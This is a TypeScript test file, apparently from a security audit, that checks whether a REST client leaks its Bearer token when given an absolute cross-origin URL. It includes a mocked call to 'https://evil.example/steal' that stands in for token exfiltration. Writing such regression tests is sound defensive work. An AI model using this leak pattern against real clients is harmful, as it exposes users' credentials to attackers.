// AUDIT PoC — H4 (ALTO): credential leak. `buildUrl` treats any path starting with
// http(s):// as an absolute URL (ignoring baseUrl) while the client always injects
// Authorization: Bearer <token>. A descriptor/path that resolves to a cross-origin
// absolute URL therefore ships the user's token to an attacker host. This asserts
// the token never leaves the trusted origin; it fails pre-fix.
import { test } from "node:test";
import assert from "node:assert/strict";
import { createClient } from "../src/rest.ts";

function recordingFetch() {
  const seen: Array<{ url: string; auth: string | null }> = [];
  const fn = (async (url: string | URL, init: RequestInit = {}) => {
    const h = new Headers(init.headers);
    seen.push({ url: String(url), auth: h.get("authorization") });
    return new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
  }) as unknown as typeof fetch;
  return { fn, seen };
}

test("H4: Bearer token must not be sent to a cross-origin absolute URL", async () => {
  const { fn, seen } = recordingFetch();
  const client = createClient({
    baseUrl: "https://trusted.example",
    auth: () => "SECRET-TOKEN",
    fetch: fn,
  });

  // A path that resolves to an absolute cross-origin URL (e.g. built from input).
  try {
    await client.get("https://evil.example/steal");
  } catch {
    /* rejecting the cross-origin request before sending is an acceptable fix too */
  }

  const leak = seen.find((c) => c.url.startsWith("https://evil.example"));
  assert.ok(
    !leak || leak.auth === null,
    `Bearer must not leak cross-origin — sent auth=${JSON.stringify(leak?.auth)} to ${leak?.url}`,
  );
});

test("H4: Bearer is still sent to the trusted origin (relative path)", async () => {
  const { fn, seen } = recordingFetch();
  const client = createClient({
    baseUrl: "https://trusted.example",
    auth: () => "SECRET-TOKEN",
    fetch: fn,
  });
  await client.get("/users/me");
  const call = seen.find((c) => c.url === "https://trusted.example/users/me");
  assert.equal(call?.auth, "Bearer SECRET-TOKEN");
});
